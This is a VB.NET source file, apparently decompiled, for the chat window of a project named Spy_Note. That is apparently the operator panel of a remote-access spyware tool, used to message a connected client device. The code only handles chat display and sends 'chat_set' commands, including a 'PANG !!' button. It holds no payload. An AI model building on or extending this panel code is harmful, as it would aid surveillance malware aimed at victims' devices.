Imports System.ComponentModel
Imports System.Timers
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class Chat
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public timer_0 As System.Timers.Timer
    Public timer_1 As System.Timers.Timer
    Private b91 As Integer
    Public Sub New()
        Me.b91 = 0
        Me.InitializeComponent()
    End Sub
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                Else
                    Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Ary}
                    Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                    Dim flag3 As Boolean = array2.Length = 2
                    If flag3 Then
                        Dim flag4 As Boolean = Operators.CompareString(array2(0), "Connected", False) = 0 And Operators.CompareString(array2(1), "OpWin", False) = 0
                        If flag4 Then
                            Dim visible As Boolean = Me.Panel2.Visible
                            If visible Then
                                Me.Panel2.Visible = False
                            End If
                        Else
                            Dim flag5 As Boolean = Operators.CompareString(array2(0), "write", False) = 0
                            If flag5 Then
                                Dim flag6 As Boolean = Not Me.Panel2.Visible
                                If flag6 Then
                                    Me.Panel2.Visible = True
                                End If
                                Me.Label1.Text = array2(1)
                                Dim enabled As Boolean = Me.timer_0.Enabled
                                If enabled Then
                                    Me.timer_0.Enabled = False
                                End If
                                Me.timer_0.Enabled = True
                                Dim flag7 As Boolean = Not Me.timer_1.Enabled
                                If flag7 Then
                                    Me.timer_1.Enabled = True
                                End If
                            Else
                                Dim flag8 As Boolean = Operators.CompareString(array2(0), "null", False) = 0
                                If flag8 Then
                                    Dim visible2 As Boolean = Me.Panel2.Visible
                                    If visible2 Then
                                        Me.Panel2.Visible = False
                                    End If
                                    Me.Label1.Text = Nothing
                                Else
                                    Dim visible3 As Boolean = Me.Panel2.Visible
                                    If visible3 Then
                                        Me.Panel2.Visible = False
                                    End If
                                    Me.DataGridView1.Rows.Add(New Object() {array2(0) + Strings.Space(10), array2(1)})
                                    Me.ToEnd()
                                End If
                            End If
                        End If
                    End If
                    Me.refres_title()
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ToEnd()
        Me.DataGridView1.FirstDisplayedScrollingRowIndex = Me.DataGridView1.RowCount - 1
        Me.DataGridView1.CurrentCell = Nothing
        Me.DataGridView1.Rows(Me.DataGridView1.RowCount - 1).Selected = True
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("Chat - Remote Address & Port: {0} Client Name: {1} - Item: {2} Item Selection: {3}", New Object() {Me.Client_remote_Address, Me.Name_Client, Conversions.ToString(Me.DataGridView1.Rows.Count), Conversions.ToString(Me.DataGridView1.SelectedRows.Count)})
        Me.Text = text
    End Sub
    Private Sub Chat_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.Label2.Text = Nothing
        Me.timer_0 = New System.Timers.Timer(5000.0)
        AddHandler Me.timer_0.Elapsed, New ElapsedEventHandler(AddressOf Me.OnTimedEvent1)
        Me.timer_0.AutoReset = True
        Me.timer_1 = New System.Timers.Timer(1000.0)
        AddHandler Me.timer_1.Elapsed, AddressOf Me.OnTimedEvent1
        Me.timer_1.AutoReset = True
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
    End Sub

    Private Sub DataGridView1_SelectionChanged(sender As Object, e As EventArgs) Handles DataGridView1.SelectionChanged
        Me.refres_title()
    End Sub
    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        Dim flag As Boolean = e.KeyCode = Keys.[Return]
        If flag Then
            Dim flag2 As Boolean = Operators.CompareString(Me.TextBox1.Text, Nothing, False) <> 0
            If flag2 Then
                My.Forms.Form1.s.Send(Me.handle_Number_Client, "chat_set" + My.Forms.Form1.s.SplitData + Me.TextBox1.Text)
                Me.DataGridView1.Rows.Add(New Object() {"Me:" + Strings.Space(10), Me.TextBox1.Text})
                Me.ToEnd()
                Me.TextBox1.Text = String.Empty
            End If
        End If
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim flag As Boolean = Operators.CompareString(Me.TextBox1.Text, Nothing, False) <> 0
        If flag Then
            My.Forms.Form1.s.Send(Me.handle_Number_Client, "chat_set" + My.Forms.Form1.s.SplitData + Me.TextBox1.Text)
            Me.DataGridView1.Rows.Add(New Object() {"Me:" + Strings.Space(10), Me.TextBox1.Text})
            Me.ToEnd()
            Me.TextBox1.Text = String.Empty
        End If
    End Sub

    Private Sub Chat_Closing(sender As Object, e As CancelEventArgs) Handles Me.Closing
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "chat_set" + My.Forms.Form1.s.SplitData + "/exit/chat/")
    End Sub

    Private Sub OnTimedEvent1(source As Object, e As ElapsedEventArgs)
        Dim visible As Boolean = Me.Panel2.Visible
        If visible Then
            Me.Label2.Text = Me.e90()
            Me.b91 += 1
        Else
            Me.Label2.Text = Nothing
            Me.b91 = 0
            Me.timer_1.Enabled = False
        End If
    End Sub
    Public Function e90() As String
        Dim flag As Boolean = Me.b91 > 2
        If flag Then
            Me.b91 = 0
        End If
        Dim result As String
        Select Case Me.b91
            Case 0
                result = "."
            Case 1
                result = ".."
            Case 2
                result = "..."
            Case Else
                result = "..."
        End Select
        Return result
    End Function

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "chat_set" + My.Forms.Form1.s.SplitData + "PANG !!")
        Me.DataGridView1.Rows.Add(New Object() {"Me:" + Strings.Space(10), "PANG !!"})
        Me.ToEnd()
    End Sub
End Class